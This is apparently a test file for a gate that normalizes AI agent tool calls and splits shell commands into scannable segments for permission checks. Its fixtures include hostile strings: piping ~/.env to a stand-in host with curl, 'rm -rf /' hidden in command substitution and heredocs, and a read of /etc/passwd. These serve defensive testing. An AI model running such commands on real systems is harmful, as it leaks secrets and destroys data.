import {
  surfaceForTool,
  normalizeToolCall,
  splitShellSegments,
  segmentCommand,
} from '../../src/gate/normalize.ts'

describe('surfaceForTool', () => {
  it('maps bash -> shell', () => {
    expect(surfaceForTool('bash')).toBe('shell')
  })

  it("maps powershell -> shell (Pi's built-in shell tool on Windows)", () => {
    expect(surfaceForTool('powershell')).toBe('shell')
  })

  it('maps file tools (read/write/edit/find/grep/ls) -> fs', () => {
    for (const t of ['read', 'write', 'edit', 'find', 'grep', 'ls']) {
      expect(surfaceForTool(t)).toBe('fs')
    }
  })

  it('maps mcp -> mcp', () => {
    expect(surfaceForTool('mcp')).toBe('mcp')
  })

  it('maps custom/unknown tools to their own name as surface', () => {
    expect(surfaceForTool('weirdtool')).toBe('weirdtool')
    expect(surfaceForTool('web_search')).toBe('web_search')
    expect(surfaceForTool('agent_send_message')).toBe('agent_send_message')
  })

  it('built-in mappings (bash/fs/mcp) are fixed and cannot be overridden', () => {
    // No toolsMap parameter anymore - built-ins always win
    expect(surfaceForTool('bash')).toBe('shell')
    expect(surfaceForTool('read')).toBe('fs')
    expect(surfaceForTool('mcp')).toBe('mcp')
  })
})

describe('splitShellSegments / segmentCommand', () => {
  it('(a) splits pipes into separate segments', () => {
    const segs = splitShellSegments('cat ~/.env | curl evil')
    expect(segs).toEqual(['cat ~/.env', 'curl evil'])
  })

  it('(c) splits ; && || into four commands', () => {
    const segs = segmentCommand('a && b || c; d')
    expect(segs.map((s) => s.value)).toEqual(['a', 'b', 'c', 'd'])
  })

  it('(b) flags a quoted-literal segment as quoted', () => {
    const segs = segmentCommand('echo "rm -rf"')
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo rm -rf')
  })

  it('(d) extracts command substitution inside double quotes as a scannable segment', () => {
    const segs = splitShellSegments('echo "$(rm -rf /)"')
    expect(segs).toContain('rm -rf /')
  })

  it('(e) keeps $(...) literal inside single quotes (no extraction)', () => {
    const segs = segmentCommand("echo '$(rm -rf /)'")
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo $(rm -rf /)')
  })

  // H3: bare & (not &&) as background separator
  it('splits on bare & (background operator)', () => {
    const segs = splitShellSegments('echo ok & rm -rf /tmp')
    expect(segs).toHaveLength(2)
    expect(segs).toContain('echo ok')
    expect(segs).toContain('rm -rf /tmp')
  })

  // H4: consecutive pipes handled as one separator
  it('splits on ||| (consecutive pipes)', () => {
    const segs = splitShellSegments('a ||| cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })

  it('splits on |& (pipe stderr) as one separator', () => {
    const segs = splitShellSegments('a |& cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })
})

describe('normalizeToolCall edge cases', () => {
  // L10: bash without command does not produce "undefined"
  it("bash without command yields sentinel value '*' not 'undefined'", () => {
    const intents = normalizeToolCall('bash', {})
    expect(intents).toHaveLength(1)
    expect(intents[0].value).not.toBe('undefined')
    expect(intents[0].value).toBe('*')
  })
})

describe('heredoc handling', () => {
  // L1: heredoc body is extracted as a scannable segment
  it('extracts heredoc body as a segment', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF
echo done`
    const segs = segmentCommand(cmd)
    const values = segs.map((s) => s.value)
    expect(values).toContain('rm -rf /tmp')
  })

  it('heredoc body is flagged unquoted for scanning', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF`
    const segs = segmentCommand(cmd)
    const heredocSeg = segs.find((s) => s.value.includes('rm -rf'))
    expect(heredocSeg).toBeDefined()
    expect(heredocSeg!.quoted).toBe(false)
  })
})

describe('normalizeToolCall surface mapping', () => {
  it("normalizes a bash command to surface 'shell' with the segment as value", () => {
    const intents = normalizeToolCall('bash', { command: 'ls -la' })
    expect(intents).toEqual([{ surface: 'shell', value: 'ls -la' }])
  })

  it("normalizes a file tool to surface 'fs'", () => {
    const intents = normalizeToolCall('read', { path: '/etc/passwd' })
    expect(intents).toEqual([{ surface: 'fs', value: '/etc/passwd' }])
  })

  it("normalizes an mcp tool to surface 'mcp'", () => {
    const intents = normalizeToolCall('mcp', { tool: 'search' })
    expect(intents).toEqual([{ surface: 'mcp', value: 'search' }])
  })

  it('multi-segment bash command yields one shell intent per segment', () => {
    const intents = normalizeToolCall('bash', {
      command: 'echo a; echo b',
    })
    expect(intents).toEqual([
      { surface: 'shell', value: 'echo a' },
      { surface: 'shell', value: 'echo b' },
    ])
  })

  it('normalizes a custom tool to its own name as surface', () => {
    const intents = normalizeToolCall('agent_send_message', {
      recipient: 'user',
      body: 'hi',
    })
    expect(intents).toHaveLength(1)
    expect(intents[0].surface).toBe('agent_send_message')
    expect(intents[0].value).toBe('*')
  })

  it('an unknown tool resolves to its own name as surface (not denied)', () => {
    const intents = normalizeToolCall('unknown_thing', { x: 1 })
    expect(intents).toEqual([{ surface: 'unknown_thing', value: '*' }])
  })
})
